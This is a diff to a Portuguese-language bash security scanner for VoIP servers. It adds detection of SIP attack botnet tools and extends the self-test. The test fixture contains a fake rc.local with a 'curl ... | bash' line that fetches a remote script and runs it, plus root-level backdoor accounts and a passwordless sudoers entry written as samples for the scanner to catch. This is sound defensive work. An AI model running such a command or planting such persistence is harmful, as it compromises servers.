@@ -352,6 +352,7 @@ cmd_audit() {
       /tmp/*|/var/tmp/*|/dev/shm/*|*"(deleted)"*) warn "processo $pid rodando de local suspeito: $exe ($(tr '\0' ' ' < /proc/$pid/cmdline 2>/dev/null | cut -c1-80))" ;;
     esac
   done
+  pgrep -af 'sipsentinel/agent\.py|svmap|svwar|svcrack|sipvicious' 2>/dev/null | head -5 | while read -r l; do warn "PROCESSO DE ATAQUE SIP em execucao (botnet): $(echo "$l" | cut -c1-120)"; done
   info "maiores consumidores de CPU:"; ps -eo pid,user,pcpu,comm --sort=-pcpu 2>/dev/null | head -6 | sed 's/^/     /'
 
   sec "4. Portas abertas"
@@ -359,6 +360,7 @@ cmd_audit() {
   ss -tlnH 2>/dev/null | awk '{print $4}' | grep -E '^(\*|0\.0\.0\.0|\[::\]):(3306|5038|5432|6379|27017|11211|9200)$' | while read -r l; do warn "porta sensivel aberta para todas as interfaces: $l"; done
 
   sec "5. Persistencia e rootkit"
+  for f in /opt/sipsentinel /etc/sipsentinel /tmp/.sipvicious-home; do [ -e "$f" ] && warn "pasta de ferramenta de ataque SIP (botnet): $f"; done
   [ -s /etc/ld.so.preload ] && warn "/etc/ld.so.preload existe (tipico de rootkit): $(cat /etc/ld.so.preload | head -3 | tr '\n' ' ')"
   for f in /etc/rc.local /etc/rc.d/rc.local; do
     [ -r "$f" ] || continue
@@ -618,7 +620,18 @@ check_immutable() {
   done
 }
 
-host_checks() { check_firewall; check_dialplan; check_cron; check_framework; check_persistence; check_immutable; }
+# Agente de botnet de ataque SIP (caso real: "SIP Sentinel" em /opt/sipsentinel, usa SIPVicious/svmap
+# para varrer redes de terceiros e tentar chamadas fraudulentas). So alerta, uma vez por achado.
+check_botnet() {
+  local d p
+  for d in ${SENTINEL_BOTNET_DIRS:-/opt/sipsentinel /etc/sipsentinel /tmp/.sipvicious-home}; do
+    [ -e "$d" ] && persist_alert "botnet|dir|$d" "pasta de ferramenta de ataque SIP encontrada: $d (agente que varre redes de terceiros e tenta chamadas fraudulentas)"
+  done
+  p="$(pgrep -af 'sipsentinel/agent\.py|svmap|svwar|svcrack|sipvicious' 2>/dev/null | head -1)"
+  [ -n "$p" ] && persist_alert "botnet|proc" "processo de varredura/ataque SIP em execucao neste servidor: $(echo "$p" | cut -c1-120)"
+}
+
+host_checks() { check_firewall; check_dialplan; check_cron; check_framework; check_persistence; check_immutable; check_botnet; }
 
 do_scan() {
   local mode="$1"
@@ -716,13 +729,14 @@ cmd_selftest() {
   printf 'root:x:0:0:root:/root:/bin/bash\nyum:x:0:0::/home/yum:/bin/bash\nabort:x:0:0::/:/bin/bash\nasterisk:x:100:100::/:/bin/bash\n' > "$T/passwd"
   printf '#!/bin/bash\n/usr/local/sbin/motd.sh > /etc/motd\nbash -c "curl -ks http://203.0.113.9/r/postroot.sh|bash"\n' > "$T/rc.local"
   printf 'asterisk ALL = NOPASSWD: /sbin/service\nasterisk ALL=(ALL) NOPASSWD: ALL\n' > "$T/sudoers"
+  mkdir -p "$T/botdir"
   printf '#!/bin/bash\nprintf -- "----i---------e-- %%s\\n" "$2"\n' > "$T/bin/lsattr"; chmod +x "$T/bin/lsattr"
-  ( PATH="$T/bin:$PATH" WEB_DIR="$T/web" SENTINEL_QUAR="$T/quar" SENTINEL_LOG="$T/log" SENTINEL_NO_ALERT=1 SENTINEL_CONF=/nonexistent SENTINEL_ALLOW=/nonexistent SENTINEL_STATE="$T/state" SENTINEL_ACL_DB=/nonexistent SENTINEL_CRED_FILES="" SENTINEL_FIREWALL_HEAL=0 SENTINEL_DIALPLAN_GLOB="$T/extensions*.conf" SENTINEL_CRON_DIR="$T/cron" SENTINEL_FRAMEWORK_VER="4.0.0-12" SENTINEL_PASSWD="$T/passwd" SENTINEL_RCLOCAL="$T/rc.local" SENTINEL_SUDOERS="$T/sudoers" SENTINEL_ATTR_FILES="$T/passwd" "$0" --scan >/dev/null 2>&1 )
+  ( PATH="$T/bin:$PATH" WEB_DIR="$T/web" SENTINEL_QUAR="$T/quar" SENTINEL_LOG="$T/log" SENTINEL_NO_ALERT=1 SENTINEL_CONF=/nonexistent SENTINEL_ALLOW=/nonexistent SENTINEL_STATE="$T/state" SENTINEL_ACL_DB=/nonexistent SENTINEL_CRED_FILES="" SENTINEL_FIREWALL_HEAL=0 SENTINEL_DIALPLAN_GLOB="$T/extensions*.conf" SENTINEL_CRON_DIR="$T/cron" SENTINEL_FRAMEWORK_VER="4.0.0-12" SENTINEL_PASSWD="$T/passwd" SENTINEL_RCLOCAL="$T/rc.local" SENTINEL_SUDOERS="$T/sudoers" SENTINEL_ATTR_FILES="$T/passwd" SENTINEL_BOTNET_DIRS="$T/botdir" "$0" --scan >/dev/null 2>&1 )
   chk() { if [ "$2" = "gone" ] && [ ! -e "$1" ]; then ok=$((ok+1)); elif [ "$2" = "kept" ] && [ -e "$1" ]; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: $1 deveria estar '$2'"; fi; }
   chk "$T/web/modules/a_emad.php" gone;  chk "$T/web/modules/b_chain.php" gone;  chk "$T/web/modules/c_decode.php" gone
   chk "$T/web/images/d_static.php" gone; chk "$T/web/admin/modules/phones" gone
   chk "$T/web/modules/legitimo.php" kept; chk "$T/web/admin/libraries/php-upgrade/compat.php" kept; chk "$T/web/admin/modules/core/XML_Unserializer.php" kept
-  for k in "FIREWALL: iptables parado" "DIALPLAN malicioso" "CRON suspeito" "FRAMEWORK vulneravel" "PERSISTENCIA: usuario com poderes de root alem do root: yum" "PERSISTENCIA: usuario com poderes de root alem do root: abort" "baixa e executa script remoto a cada boot" "sudo SEM SENHA para qualquer comando" "PROTEGIDO contra alteracao"; do
+  for k in "FIREWALL: iptables parado" "DIALPLAN malicioso" "CRON suspeito" "FRAMEWORK vulneravel" "PERSISTENCIA: usuario com poderes de root alem do root: yum" "PERSISTENCIA: usuario com poderes de root alem do root: abort" "baixa e executa script remoto a cada boot" "sudo SEM SENHA para qualquer comando" "PROTEGIDO contra alteracao" "ferramenta de ataque SIP"; do
     if grep -qF "$k" "$T/log"; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: alerta '$k' nao gerado"; fi
   done
   rm -rf "$T"
